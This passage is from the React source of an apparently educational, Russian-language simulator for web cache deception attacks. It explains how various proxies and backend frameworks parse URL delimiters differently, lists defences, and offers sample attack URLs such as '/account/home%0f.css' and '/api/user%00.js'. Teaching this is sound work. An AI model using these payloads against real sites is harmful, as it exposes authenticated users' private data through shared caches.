                    <li>• Уважает Cache-Control: <code className="text-muted-foreground">{proxyConfig.respectCacheControl ? 'Да' : 'Нет'}</code></li>
                    <li>• Default TTL: <code className="text-amber-400">{proxyConfig.defaultTtl}s</code></li>
                  </ul>
                </div>
                <div className="p-2.5 sm:p-3 rounded-lg bg-red-500/5 border border-red-500/20">
                  <p className="text-[10px] sm:text-xs font-medium text-red-400 mb-1.5">Почему кэш ошибается</p>
                  <p className="text-[10px] sm:text-xs text-muted-foreground">
                    {proxyConfig.type === 'cloudflare'
                      ? 'Cloudflare определяет тип ресурса по расширению файла в URL. Символы вроде %0f не удаляются из URL перед проверкой, поэтому /home%0f.css выглядит как CSS-файл. Ключ кэша использует полный URL без нормализации.'
                      : proxyConfig.type === 'nginx'
                        ? 'Nginx нормализует URL перед проверкой location, но ключ кэша может использовать нормализованный путь. Однако если upstream получает оригинальный URL, расхождение всё равно возможно при определённых конфигурациях proxy_pass.'
                        : proxyConfig.type === 'apache'
                          ? 'Apache не нормализует URL агрессивно, как Nginx. Символы %0f, %00, %0a проходят через mod_rewrite без изменений. mod_cache проверяет расширение URL (.css = кэшировать) без проверки Content-Type. Если включены CacheIgnoreCacheControl или CacheStoreNoStore — Apache кэширует вообще всё.'
                          : proxyConfig.type === 'flyio'
                            ? 'Fly.io использует внутренний обратный прокси, который НЕ нормализует URL. Спецсимволы %0f, %00, %0a проходят через прокси как есть. Если настроен fly-cache-url или Varnish sidecar, расширение URL (.css) определяет кэширование — без проверки Content-Type и без нормализации.'
                            : proxyConfig.type === 'cloudflare_workers'
                              ? 'Cloudflare Workers могут программно управлять кэшем через Cache API. Если Worker кэширует по расширению URL без проверки Content-Type — он закэширует динамический контент. Workers НЕ нормализуют URL автоматически — спецсимволы %0f, %00, %0a проходят как есть.'
                              : 'Varnish использует req.url как есть для хеширования. Если VCL-правило проверяет расширение регулярным выражением, URL с %0f.css попадёт под правило для статических файлов. Varnish не нормализует URL автоматически.'}
                  </p>
                </div>
              </div>

              {/* Config file */}
              <CodeBlock
                code={PROXY_CONFIG_FILES[proxyType]}
                title={`Конфигурация ${proxyType === 'cloudflare' ? 'Cloudflare' : proxyType === 'nginx' ? 'Nginx' : proxyType === 'apache' ? 'Apache' : proxyType === 'flyio' ? 'Fly.io' : proxyType === 'cloudflare_workers' ? 'CF Workers' : 'Varnish'}`}
                icon={<FileCode className="h-3.5 w-3.5 text-amber-400" />}
              />
            </CardContent>
          </Card>

          {/* Backend selector */}
          <Card className="border-border">
            <CardHeader className="p-3 sm:p-4 pb-2">
              <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2">
                <div className="flex items-center gap-2">
                  <Server className="h-4 w-4 text-blue-400" />
                  <CardTitle className="text-sm sm:text-base font-semibold">Сервер-источник (Backend)</CardTitle>
                </div>
                <div className="flex flex-wrap gap-1.5 sm:gap-2">
                    {(['nodejs', 'python', 'java', 'ruby', 'django', 'laravel', 'go', 'dotnet'] as const).map(type => (
                      <Button
                        key={type}
                        variant={backendType === type ? 'default' : 'outline'}
                        size="sm"
                        onClick={() => setBackendType(type)}
                        className={`text-[10px] sm:text-xs h-7 sm:h-8 min-w-[44px] ${backendType === type ? 'bg-blue-500/20 text-blue-400 border-blue-500/30 hover:bg-blue-500/30' : ''}`}
                      >
                        {type === 'nodejs' ? 'Node.js' : type === 'python' ? 'Flask' : type === 'java' ? 'Spring' : type === 'ruby' ? 'Rails' : type === 'django' ? 'Django' : type === 'laravel' ? 'Laravel' : type === 'go' ? 'Go' : '.NET'}
                      </Button>
                    ))}
                </div>
              </div>
            </CardHeader>
            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4 space-y-3">
              {/* Backend explanation */}
              <div className="grid sm:grid-cols-2 gap-3">
                <div className="p-2.5 sm:p-3 rounded-lg bg-blue-500/5 border border-blue-500/20">
                  <p className="text-[10px] sm:text-xs font-medium text-blue-400 mb-1.5">Обработка URL</p>
                  <ul className="text-[10px] sm:text-xs text-muted-foreground space-y-1">
                    <li>• Распознаваемые разделители: <code className="text-blue-400">{backendConfig.stripDelimiters.join(', ') || 'нет'}</code></li>
                    <li>• Обрезать после разделителя: <code className={backendConfig.ignoreAfterDelimiter ? 'text-emerald-400' : 'text-red-400'}>{backendConfig.ignoreAfterDelimiter ? 'Да' : 'Нет'}</code></li>
                    <li>• Точка = формат: <code className="text-muted-foreground">{backendConfig.treatDotAsFormat ? 'Да' : 'Нет'}</code></li>
                  </ul>
                </div>
                <div className="p-2.5 sm:p-3 rounded-lg bg-red-500/5 border border-red-500/20">
                  <p className="text-[10px] sm:text-xs font-medium text-red-400 mb-1.5">Почему возникает расхождение</p>
                  <p className="text-[10px] sm:text-xs text-muted-foreground">
                    {backendConfig.type === 'nodejs'
                      ? 'Express декодирует URL и пытается сопоставить маршрут. Если путь содержит непечатные символы (%0f), маршрут не совпадает напрямую. Но если прокси обрезает разделитель ПЕРЕД передачей на backend, Express получит чистый путь /account/home и вернёт данные пользователя — без заголовка Cache-Control: no-store.'
                      : backendConfig.type === 'python'
                        ? 'Flask декодирует URL и ищёт точное совпадение маршрута. Разделители %0a и %00 обрезают путь, но %0f — нет. Если прокси передаёт обрезанный путь, Flask возвращает данные пользователя без Cache-Control: no-store.'
                        : backendConfig.type === 'java'
                          ? 'Spring MVC обрабатывает точку с запятой как matrix-параметры и игнорирует их при маршрутизации. Null-byte (%00) обрезает путь в Tomcat. Это создаёт расхождение: прокси видит .css, а Spring матчит маршрут без расширения.'
                          : backendConfig.type === 'ruby'
                            ? 'Rails интерпретирует точку в пути как спецификатор формата (format). /account/home.css пытается найти CSS-шаблон. Но если прокси обрезает разделитель до передачи запроса, Rails может обработать путь как /account/home и вернуть JSON.'
                            : backendConfig.type === 'django'
                              ? 'Django ищет ТОЧНОЕ совпадение маршрута. Спецсимволы вроде %0f не дают маршруту совпасть. Но null-байт (%00) обрезает путь, и /account/home%00.css превращается в /account/home — маршрут совпадает, и Django возвращает профиль без Cache-Control.'
                              : backendConfig.type === 'laravel'
                                ? 'Laravel (PHP) обрезает строки по null-байту — унаследованное поведение от C. /account/home%00.css превращается в /account/home. Маршрут совпадает, и Laravel возвращает профиль без Cache-Control: no-store.'
                                : backendConfig.type === 'go'
                                  ? 'Go СТРОГО парсит URL через net/url. ServeMux ищет точное совпадение маршрута — спецсимволы не дают маршруту совпасть. Go НЕ обрезает строки по null-байту. Это один из самых безопасных фреймворков: атака WCD через delimiter discrepancy вряд ли сработает.'
                                  : 'ASP.NET Core строго обрабатывает URL и отклоняет null-байты с ошибкой 400. Точка с запятой НЕ обрезается (в отличие от Spring). Строгий роутинг делает ASP.NET Core одним из самых безопасных фреймворков.'}
                  </p>
                </div>
              </div>

              {/* Backend config file */}
              <CodeBlock
                code={BACKEND_CONFIG_FILES[backendType]}
                title={`Код сервера (${backendConfig.type === 'nodejs' ? 'Node.js' : backendConfig.type === 'python' ? 'Flask' : backendConfig.type === 'java' ? 'Spring' : backendConfig.type === 'ruby' ? 'Rails' : backendConfig.type === 'django' ? 'Django' : backendConfig.type === 'laravel' ? 'Laravel' : backendConfig.type === 'go' ? 'Go' : 'ASP.NET'})`}
                icon={<FileCode className="h-3.5 w-3.5 text-blue-400" />}
              />
            </CardContent>
          </Card>

          {/* Discrepancy explanation */}
          <Card className="border-emerald-500/20 bg-gradient-to-br from-emerald-500/5 to-cyan-500/5">
            <CardHeader className="p-3 sm:p-4 pb-2">
              <div className="flex items-center gap-2">
                <Shield className="h-4 w-4 text-emerald-400" />
                <CardTitle className="text-sm sm:text-base font-semibold">Как возникает расхождение</CardTitle>
              </div>
            </CardHeader>
            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4">
              <div className="space-y-3">
                <div className="flex items-start gap-3 p-2.5 sm:p-3 rounded-lg bg-background/50 border border-border">
                  <div className="flex h-7 w-7 items-center justify-center rounded-full bg-amber-500/20 shrink-0 mt-0.5">
                    <span className="text-xs font-bold text-amber-400">1</span>
                  </div>
                  <div>
                    <p className="text-xs sm:text-sm font-medium text-foreground">Прокси-сервер проверяет расширение файла</p>
                    <p className="text-[10px] sm:text-xs text-muted-foreground mt-0.5">
                      URL <code className="text-amber-400">/account/home%0f.css</code> оканчивается на <code className="text-amber-400">.css</code>.
                      Прокси решает: это статический CSS-файл, нужно кэшировать. Он не декодирует и не обрезает разделители — просто проверяет окончание пути.
                    </p>
                  </div>
                </div>
                <ArrowDown className="h-4 w-4 text-muted-foreground mx-auto" />
                <div className="flex items-start gap-3 p-2.5 sm:p-3 rounded-lg bg-background/50 border border-border">
                  <div className="flex h-7 w-7 items-center justify-center rounded-full bg-blue-500/20 shrink-0 mt-0.5">
                    <span className="text-xs font-bold text-blue-400">2</span>
                  </div>
                  <div>
                    <p className="text-xs sm:text-sm font-medium text-foreground">Backend декодирует и обрезает разделитель</p>
                    <p className="text-[10px] sm:text-xs text-muted-foreground mt-0.5">
                      Backend получает URL, декодирует <code className="text-blue-400">%0f</code> в управляющий символ,
                      обрезает всё после него и видит путь <code className="text-blue-400">/account/home</code>.
                      Маршрут совпадает — сервер возвращает профиль пользователя с конфиденциальными данными.
                    </p>
                  </div>
                </div>
                <ArrowDown className="h-4 w-4 text-muted-foreground mx-auto" />
                <div className="flex items-start gap-3 p-2.5 sm:p-3 rounded-lg bg-red-500/5 border border-red-500/20">
                  <div className="flex h-7 w-7 items-center justify-center rounded-full bg-red-500/20 shrink-0 mt-0.5">
                    <span className="text-xs font-bold text-red-400">3</span>
                  </div>
                  <div>
                    <p className="text-xs sm:text-sm font-medium text-red-400">Прокси кэширует ответ с данными пользователя</p>
                    <p className="text-[10px] sm:text-xs text-muted-foreground mt-0.5">
                      Ответ от Backend приходит к прокси. Прокси видит, что URL был <code className="text-amber-400">.css</code>,
                      и кэширует ответ как статический файл. Теперь любой, кто запросит этот URL, получит данные жертвы из кэша — без аутентификации.
                    </p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* ──────────── TAB 2: Simulation ──────────── */}
        <TabsContent value="simulation" className="space-y-4 sm:space-y-5">
          {/* URL Input */}
          <Card className="border-emerald-500/20">
            <CardContent className="p-3 sm:p-4">
              <div className="flex flex-col sm:flex-row gap-3">
                <div className="flex-1">
                  <label className="text-[10px] sm:text-xs font-medium text-muted-foreground mb-1.5 block">
                    Введите URL для анализа (Прокси: {proxyConfig.type}, Backend: {backendConfig.type})
                  </label>
                  <div className="flex gap-2">
                    <Input
                      value={urlInput}
                      onChange={(e) => setUrlInput(e.target.value)}
                      placeholder="/account/home%0f.css"
                      className="font-mono text-xs sm:text-sm"
                      onKeyDown={(e) => e.key === 'Enter' && runSimulation()}
                    />
                    <Button
                      onClick={runSimulation}
                      disabled={isAnimating}
                      className="bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-600 hover:to-cyan-600 text-white shrink-0 text-xs sm:text-sm"
                    >
                      <Play className="h-3.5 w-3.5 sm:h-4 sm:w-4 mr-1 sm:mr-2" />
                      Запуск
                    </Button>
                    <Button variant="outline" onClick={reset} className="shrink-0">
                      <RotateCcw className="h-3.5 w-3.5 sm:h-4 sm:w-4" />
                    </Button>
                  </div>
                </div>
              </div>

              {/* Example URLs */}
              <div className="mt-2.5 sm:mt-3">
                <p className="text-[10px] sm:text-xs text-muted-foreground mb-1.5 sm:mb-2">Примеры URL:</p>
                <div className="flex flex-wrap gap-1.5 sm:gap-2">
                  {ATTACK_VARIANTS.filter(v => v.category === 'basic' || (v.category === 'delimiter' && v.extension === 'css')).slice(0, 6).map((v) => (
                    <button
                      key={v.url}
                      onClick={() => setUrlInput(v.url)}
                      className="inline-flex items-center gap-1 sm:gap-1.5 px-2 sm:px-2.5 py-1 rounded-md text-[10px] sm:text-xs font-mono border border-border hover:border-emerald-500/30 hover:bg-emerald-500/5 transition-colors"
                    >
                      {v.severity !== 'safe' ? (
                        <AlertTriangle className="h-2.5 w-2.5 sm:h-3 sm:w-3 text-red-400" />
                      ) : (
                        <CheckCircle2 className="h-2.5 w-2.5 sm:h-3 sm:w-3 text-emerald-400" />
                      )}
                      <span className="text-muted-foreground">{v.label}</span>
                    </button>
                  ))}
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="grid lg:grid-cols-2 gap-4 sm:gap-5">
            {/* Flow Diagram */}
            <div className="space-y-3">
              <h3 className="text-sm sm:text-base font-semibold flex items-center gap-2">
                <Eye className="h-4 w-4 text-emerald-400" />
                Визуализация потока
              </h3>
              {result && currentStep > 0 ? (
                <FlowDiagram result={result} step={currentStep} />
              ) : (
                <Card className="border-border">
                  <CardContent className="p-6 sm:p-8 text-center">
                    <FlaskConical className="h-10 w-10 sm:h-12 sm:w-12 text-muted-foreground/30 mx-auto mb-3" />
                    <p className="text-xs sm:text-sm text-muted-foreground">
                      Введите URL и нажмите «Запуск» для начала симуляции
                    </p>
                  </CardContent>
                </Card>
              )}

              {/* Detailed cards */}
              {result && currentStep >= 2 && (
                <div className="grid sm:grid-cols-2 gap-3">
                  <Card className={`border-${result.cache.isStatic ? 'amber' : 'emerald'}-500/30`}>
                    <CardHeader className="p-3 pb-2">
                      <div className="flex items-center gap-2">
                        <Database className="h-3.5 w-3.5 text-amber-400" />
                        <CardTitle className="text-xs font-semibold">Интерпретация Cache</CardTitle>
                      </div>
                    </CardHeader>
                    <CardContent className="px-3 pb-3 space-y-1.5">
                      <p className="text-[10px] text-muted-foreground">{result.cache.interpretation}</p>
                      <pre className="text-[10px] font-mono text-amber-400 bg-muted/50 rounded p-2 whitespace-pre-wrap">{result.cache.cacheHeaders}</pre>
                    </CardContent>
                  </Card>
                  <Card className="border-blue-500/30">
                    <CardHeader className="p-3 pb-2">
                      <div className="flex items-center gap-2">
                        <Server className="h-3.5 w-3.5 text-blue-400" />
                        <CardTitle className="text-xs font-semibold">Интерпретация Backend</CardTitle>
                      </div>
                    </CardHeader>
                    <CardContent className="px-3 pb-3 space-y-1.5">
                      <p className="text-[10px] text-muted-foreground">{result.backend.interpretation}</p>
                      <pre className="text-[10px] font-mono text-blue-400 bg-muted/50 rounded p-2 whitespace-pre-wrap">{result.backend.responsePreview}</pre>
                    </CardContent>
                  </Card>
                </div>
              )}

              {/* Discrepancy */}
              {currentStep >= 4 && result?.isVulnerable && (
                <Card className="border-red-500/30 bg-red-500/5">
                  <CardContent className="p-3">
                    <div className="flex items-start gap-2.5">
                      <AlertTriangle className="h-5 w-5 text-red-400 shrink-0 mt-0.5" />
                      <div>
                        <p className="text-xs font-semibold text-red-400">Расхождение обнаружено!</p>
                        <p className="text-[10px] sm:text-xs text-muted-foreground mt-1">
                          Cache видит <code className="text-amber-400">.{result.cache.extension}</code>-файл и кэширует.
                          Backend видит <code className="text-blue-400">{result.backend.path}</code> и возвращает данные.
                          Разделитель: <code className="text-red-400">{result.delimiterUsed}</code>
                        </p>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              )}
            </div>

            {/* Terminal */}
            <div className="space-y-3">
              <h3 className="text-sm sm:text-base font-semibold flex items-center gap-2">
                <Terminal className="h-4 w-4 text-emerald-400" />
                Терминал
              </h3>
              <TerminalOutput lines={terminalLines} />
            </div>
          </div>
        </TabsContent>

        {/* ──────────── TAB 3: Sandbox ──────────── */}
        <TabsContent value="sandbox" className="space-y-4 sm:space-y-5">
          {/* Role indicator */}
          <Card className="border-border">
            <CardContent className="p-3 sm:p-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <p className="text-xs sm:text-sm font-medium text-foreground mb-1">Интерактивная песочница WCD</p>
                  <p className="text-[10px] sm:text-xs text-muted-foreground">
                    Сымитируйте атаку: сначала жертва переходит по ссылке, затем атакующий извлекает данные из кэша.
                    Прокси: <code className="text-amber-400">{proxyConfig.type}</code>, Backend: <code className="text-blue-400">{backendConfig.type}</code>
                  </p>
                </div>
                <div className="flex items-center gap-2">
                  <Badge className={`text-[10px] sm:text-xs ${
                    sandboxRole === 'victim'
                      ? 'bg-cyan-500/10 text-cyan-400 border-cyan-500/20'
                      : 'bg-red-500/10 text-red-400 border-red-500/20'
                  }`}>
                    {sandboxRole === 'victim' ? (
                      <><User className="h-3 w-3 mr-1" /> Жертва</>
                    ) : (
                      <><AlertTriangle className="h-3 w-3 mr-1" /> Атакующий</>
                    )}
                  </Badge>
                  {sandboxPhase !== 'idle' && (
                    <Badge className="text-[10px] sm:text-xs bg-amber-500/10 text-amber-400 border-amber-500/20 animate-pulse">
                      <Zap className="h-3 w-3 mr-1" />
                      {sandboxPhase === 'victim-request' ? 'Жертва переходит по ссылке' :
                       sandboxPhase === 'cache-store' ? 'Кэш сохраняет ответ' :
                       sandboxPhase === 'attacker-request' ? 'Атакующий запрашивает' :
                       sandboxPhase === 'data-leak' ? 'Утечка данных!' : ''}
                    </Badge>
                  )}
                </div>
              </div>

              {/* URL input */}
              <div className="mt-3 flex gap-2">
                <Input
                  value={sandboxUrl}
                  onChange={(e) => setSandboxUrl(e.target.value)}
                  placeholder="/account/home%0f.css — введите вредоносный URL"
                  className="font-mono text-xs sm:text-sm"
                  onKeyDown={(e) => e.key === 'Enter' && runSandboxAttack()}
                />
                <Button
                  onClick={runSandboxAttack}
                  disabled={sandboxPhase !== 'idle'}
                  className="bg-gradient-to-r from-red-500 to-orange-500 hover:from-red-600 hover:to-orange-600 text-white shrink-0 text-xs sm:text-sm"
                >
                  <Zap className="h-3.5 w-3.5 sm:h-4 sm:w-4 mr-1 sm:mr-2" />
                  Атака
                </Button>
                <Button variant="outline" onClick={resetSandbox} className="shrink-0">
                  <RotateCcw className="h-3.5 w-3.5 sm:h-4 sm:w-4" />
                </Button>
              </div>

              {/* Quick attack URLs */}
              <div className="mt-2">
                <p className="text-[10px] sm:text-xs text-muted-foreground mb-1.5">Быстрые сценарии:</p>
                <div className="flex flex-wrap gap-1.5">
                  {[
                    { url: '/account/home%0f.css', label: '%0f + .css' },
                    { url: '/api/user%00.js', label: 'null-byte + .js' },
                    { url: '/profile;admin.css', label: '; + .css' },
                    { url: '/dashboard%0a.png', label: '%0a + .png' },
                  ].map((ex) => (
                    <button
                      key={ex.url}
                      onClick={() => setSandboxUrl(ex.url)}
                      disabled={sandboxPhase !== 'idle'}
                      className="inline-flex items-center gap-1 px-2 py-1 rounded-md text-[10px] sm:text-xs font-mono border border-border hover:border-red-500/30 hover:bg-red-500/5 transition-colors disabled:opacity-50"
                    >
                      <AlertTriangle className="h-2.5 w-2.5 text-red-400" />
                      {ex.label}
                    </button>
                  ))}
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="grid lg:grid-cols-5 gap-4 sm:gap-5">
            {/* Network flow visualization */}
            <div className="lg:col-span-2 space-y-3">
              <h3 className="text-sm sm:text-base font-semibold flex items-center gap-2">
                <Globe className="h-4 w-4 text-cyan-400" />
                Сетевой поток
              </h3>

              {/* Victim box */}
              <div className={`p-2.5 sm:p-3 rounded-lg border transition-all duration-500 ${
                sandboxPhase === 'victim-request'
                  ? 'border-cyan-500/40 bg-cyan-500/10 shadow-lg shadow-cyan-500/10'
                  : 'border-border bg-card'
              }`}>
                <div className="flex items-center gap-2">
                  <div className="flex h-8 w-8 items-center justify-center rounded-full bg-cyan-500/20 shrink-0">
                    <User className="h-4 w-4 text-cyan-400" />
                  </div>
                  <div>
                    <p className="text-xs font-medium text-foreground">Жертва</p>
                    <p className="text-[10px] text-muted-foreground">Аутентифицированный пользователь</p>
                  </div>
                </div>
              </div>

              {sandboxPhase !== 'idle' && (
                <div className="flex justify-center">
                  <ArrowDown className={`h-4 w-4 ${
                    sandboxPhase === 'victim-request' ? 'text-cyan-400 animate-bounce' : 'text-muted-foreground'
                  }`} />
                </div>
              )}

              {/* Cache box */}
              <div className={`p-2.5 sm:p-3 rounded-lg border transition-all duration-500 ${
                sandboxPhase === 'cache-store'
                  ? 'border-amber-500/40 bg-amber-500/10 shadow-lg shadow-amber-500/10'
                  : sandboxPhase === 'attacker-request' || sandboxPhase === 'data-leak'
                    ? 'border-amber-500/20 bg-amber-500/5'
                    : 'border-border bg-card'
              }`}>
                <div className="flex items-center gap-2 mb-2">
                  <div className="flex h-8 w-8 items-center justify-center rounded-full bg-amber-500/20 shrink-0">
                    <Database className="h-4 w-4 text-amber-400" />
                  </div>
                  <div className="flex-1">
                    <p className="text-xs font-medium text-foreground">Прокси-сервер (Cache)</p>
                    <p className="text-[10px] text-muted-foreground">{proxyConfig.type}</p>
                  </div>
                </div>
                {/* Cache entries */}
                {sandboxCacheEntries.size > 0 && (
                  <div className="mt-2 space-y-1.5">
                    {Array.from(sandboxCacheEntries.entries()).map(([key, value]) => (
                      <div key={key} className="p-2 rounded bg-amber-500/10 border border-amber-500/20 animate-in fade-in duration-500">
                        <p className="text-[10px] font-mono text-amber-400 break-all">{key}</p>
                        <p className="text-[10px] text-muted-foreground mt-0.5">TTL: {value.ttl}s | <span className="text-red-400">Содержит данные жертвы</span></p>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {sandboxPhase !== 'idle' && (
                <div className="flex justify-center">
                  <ArrowDown className={`h-4 w-4 ${
                    sandboxPhase === 'victim-request' || sandboxPhase === 'cache-store'
                      ? 'text-amber-400 animate-bounce' : 'text-muted-foreground'
                  }`} />
                </div>
              )}

              {/* Backend box */}
              <div className={`p-2.5 sm:p-3 rounded-lg border transition-all duration-500 ${
                sandboxPhase === 'victim-request' || sandboxPhase === 'cache-store'
                  ? 'border-blue-500/40 bg-blue-500/10 shadow-lg shadow-blue-500/10'
                  : 'border-border bg-card'
              }`}>
                <div className="flex items-center gap-2">
                  <div className="flex h-8 w-8 items-center justify-center rounded-full bg-blue-500/20 shrink-0">
                    <Server className="h-4 w-4 text-blue-400" />
                  </div>
                  <div>
                    <p className="text-xs font-medium text-foreground">Сервер-источник (Backend)</p>
                    <p className="text-[10px] text-muted-foreground">{backendConfig.type}</p>
                  </div>
                </div>
              </div>

              {sandboxPhase === 'data-leak' && (
                <>
                  <div className="flex justify-center animate-in fade-in duration-300">
                    <ArrowDown className="h-4 w-4 text-red-400" />
                  </div>
                  <div className="p-2.5 sm:p-3 rounded-lg border border-red-500/40 bg-red-500/10 animate-in fade-in duration-500">
                    <div className="flex items-center gap-2">
                      <div className="flex h-8 w-8 items-center justify-center rounded-full bg-red-500/20 shrink-0">
                        <AlertTriangle className="h-4 w-4 text-red-400" />
                      </div>
                      <div>
                        <p className="text-xs font-medium text-red-400">Атакующий</p>
                        <p className="text-[10px] text-muted-foreground">Получает данные из кэша без аутентификации</p>
                      </div>
                    </div>
                  </div>
                </>
              )}
            </div>

            {/* Terminal */}
            <div className="lg:col-span-3 space-y-3">
              <h3 className="text-sm sm:text-base font-semibold flex items-center gap-2">
                <Terminal className="h-4 w-4 text-emerald-400" />
                Терминал песочницы
              </h3>
              <TerminalOutput lines={sandboxTerminalLines} />

              {/* Explanation panel */}
              {sandboxPhase === 'data-leak' && (
                <Card className="border-red-500/30 bg-gradient-to-br from-red-500/5 to-orange-500/5 animate-in fade-in slide-in-from-bottom-2 duration-500">
                  <CardContent className="p-3 sm:p-4">
                    <div className="flex items-start gap-2.5">
                      <Shield className="h-5 w-5 text-red-400 shrink-0 mt-0.5" />
                      <div className="space-y-2">
                        <p className="text-xs sm:text-sm font-semibold text-red-400">Атака завершена успешно</p>
                        <p className="text-[10px] sm:text-xs text-muted-foreground">
                          Атакующий получил конфиденциальные данные жертвы из кэша прокси-сервера.
                          Это произошло потому, что прокси-сервер (<code className="text-amber-400">{proxyConfig.type}</code>) и сервер-источник
                          (<code className="text-blue-400">{backendConfig.type}</code>) по-разному интерпретируют URL с разделителями.
                        </p>
                        <div className="p-2 rounded bg-background/50 border border-border space-y-1">
                          <p className="text-[10px] sm:text-xs font-medium text-foreground">Как защититься:</p>
                          <ul className="text-[10px] sm:text-xs text-muted-foreground space-y-0.5">
                            <li>1. Добавляйте <code className="text-emerald-400">Cache-Control: no-store</code> для всех динамических ответов</li>
                            <li>2. Нормализуйте URL на уровне прокси-сервера перед проверкой расширений</li>
                            <li>3. Используйте <code className="text-emerald-400">Vary: Cookie</code> для разделения кэша по пользователям</li>
                            <li>4. Отклоняйте запросы с подозрительными символами в пути</li>
                          </ul>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              )}
            </div>
          </div>
        </TabsContent>

        {/* ──────────── TAB 4: Experiments ──────────── */}
        <TabsContent value="experiments" className="space-y-4 sm:space-y-5">
          {/* Header */}
          <Card className="border-border">
            <CardContent className="p-3 sm:p-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                <div>
                  <p className="text-xs sm:text-sm font-medium text-foreground mb-1">Эксперименты с вариантами атак</p>
                  <p className="text-[10px] sm:text-xs text-muted-foreground">
                    Исследуйте {ATTACK_VARIANTS.length} вариантов атак WCD для текущей конфигурации: Прокси{' '}
                    <code className="text-amber-400">{proxyConfig.type}</code>, Backend{' '}
                    <code className="text-blue-400">{backendConfig.type}</code>
                  </p>
                </div>
                <div className="flex items-center gap-2">
                  <Badge className="text-[10px] sm:text-xs bg-emerald-500/10 text-emerald-400 border-emerald-500/20">
                    <LayoutGrid className="h-3 w-3 mr-1" />
                    {filteredVariants.length} вариантов
                  </Badge>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Category filter */}
          <Card className="border-border">
            <CardHeader className="p-3 sm:p-4 pb-2">
              <div className="flex items-center gap-2">
                <Filter className="h-4 w-4 text-cyan-400" />
                <CardTitle className="text-sm sm:text-base font-semibold">Фильтр по категории</CardTitle>
              </div>
            </CardHeader>
            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4">
              <div className="flex flex-wrap gap-1.5 sm:gap-2">
                {[
                  { key: 'all', label: 'Все', count: ATTACK_VARIANTS.length },
                  { key: 'basic', label: 'Базовые', count: categoryCounts['basic'] || 0 },
                  { key: 'delimiter', label: 'Разделители', count: categoryCounts['delimiter'] || 0 },
                  { key: 'encoding', label: 'Кодировка', count: categoryCounts['encoding'] || 0 },
                  { key: 'path-manipulation', label: 'Путь', count: categoryCounts['path-manipulation'] || 0 },
                  { key: 'double-encoding', label: 'Двойное кодир.', count: categoryCounts['double-encoding'] || 0 },
                  { key: 'extension-spoofing', label: 'Подмена расшир.', count: categoryCounts['extension-spoofing'] || 0 },
                  { key: 'query-based', label: 'Query', count: categoryCounts['query-based'] || 0 },
                  { key: 'advanced', label: 'Продвинутые', count: categoryCounts['advanced'] || 0 },
                ].map(({ key, label, count }) => (
                  <Button
                    key={key}
                    variant={selectedCategory === key ? 'default' : 'outline'}
                    size="sm"
                    onClick={() => { setSelectedCategory(key); setBatchResults(null) }}
                    className={`text-[10px] sm:text-xs h-7 sm:h-8 min-w-[44px] ${selectedCategory === key ? 'bg-cyan-500/20 text-cyan-400 border-cyan-500/30 hover:bg-cyan-500/30' : ''}`}
                  >
                    {label}
                    <span className="ml-1 opacity-60">({count})</span>
                  </Button>
                ))}
              </div>
            </CardContent>
          </Card>

          {/* Attack variant grid */}
          <div>
            <h3 className="text-sm sm:text-base font-semibold flex items-center gap-2 mb-3">
              <Crosshair className="h-4 w-4 text-red-400" />
              Варианты атак
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2 sm:gap-3 max-h-[420px] overflow-y-auto pr-1" style={{ scrollbarWidth: 'thin' }}>
              {filteredVariants.map((variant) => {
                const severityColors: Record<string, string> = {
                  critical: 'bg-red-500/10 text-red-400 border-red-500/20',
                  high: 'bg-orange-500/10 text-orange-400 border-orange-500/20',
                  medium: 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20',
                  low: 'bg-blue-500/10 text-blue-400 border-blue-500/20',
                  safe: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20',
                }
                const categoryColors: Record<string, string> = {
                  basic: 'bg-muted text-muted-foreground',
                  delimiter: 'bg-red-500/10 text-red-400',
                  encoding: 'bg-orange-500/10 text-orange-400',
                  'path-manipulation': 'bg-yellow-500/10 text-yellow-600',
                  'double-encoding': 'bg-purple-500/10 text-purple-400',
                  'extension-spoofing': 'bg-cyan-500/10 text-cyan-400',
                  'query-based': 'bg-blue-500/10 text-blue-400',
                  advanced: 'bg-rose-500/10 text-rose-400',
                }
                const categoryLabels: Record<string, string> = {
                  basic: 'Базовый',
                  delimiter: 'Разделитель',
                  encoding: 'Кодировка',
                  'path-manipulation': 'Путь',
                  'double-encoding': 'Двойн.кодир.',
                  'extension-spoofing': 'Подмена',
                  'query-based': 'Query',
                  advanced: 'Продвинутый',
                }
                return (
                  <button
                    key={variant.url}
                    onClick={() => {
                      setSelectedVariant(variant)
                      setUrlInput(variant.url)
                      setSandboxUrl(variant.url)
                    }}
                    className={`text-left p-2.5 sm:p-3 rounded-lg border transition-all hover:shadow-md min-h-[44px] ${
                      selectedVariant?.url === variant.url
                        ? 'border-cyan-500/40 bg-cyan-500/5 shadow-md shadow-cyan-500/5'
                        : 'border-border bg-card hover:border-cyan-500/20'
                    }`}
                  >
                    <div className="flex items-start gap-2 mb-1.5">
                      <code className="text-[10px] sm:text-xs font-mono text-foreground break-all flex-1 leading-relaxed">
                        {variant.url}
                      </code>
                    </div>
                    <div className="flex flex-wrap items-center gap-1.5 mb-1.5">
                      <Badge className={`text-[9px] sm:text-[10px] px-1.5 py-0 h-4 sm:h-5 ${categoryColors[variant.category] || ''} border-0`}>
                        {categoryLabels[variant.category] || variant.category}
                      </Badge>
                      <Badge className={`text-[9px] sm:text-[10px] px-1.5 py-0 h-4 sm:h-5 ${severityColors[variant.severity] || ''} border-0`}>
                        {variant.severity === 'critical' ? '☠ Критич.' :
                         variant.severity === 'high' ? '⚠ Высокий' :
                         variant.severity === 'medium' ? '◉ Средний' :
